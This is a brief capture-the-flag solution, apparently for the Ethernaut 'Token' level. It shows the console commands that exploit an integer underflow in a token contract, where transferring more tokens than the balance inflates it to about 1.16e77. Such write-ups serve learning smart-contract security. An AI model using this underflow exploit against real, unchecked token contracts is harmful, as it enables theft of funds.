# Token solution

1. Check our current balance.  
`web3.toDecimal(await contract.balanceOf(player))`  
20  

2. Token contract doesn't check for overflow errors. We will defeat the contract by overflowing our balance. Transfer 21 tokens to address 0.  
`await contract.transfer(0, 21)`  

3. Check our new balance.  
`web3.toDecimal(await contract.balanceOf(player))`  
1.157920892373162e+77  

4. Submit instance 🎉   
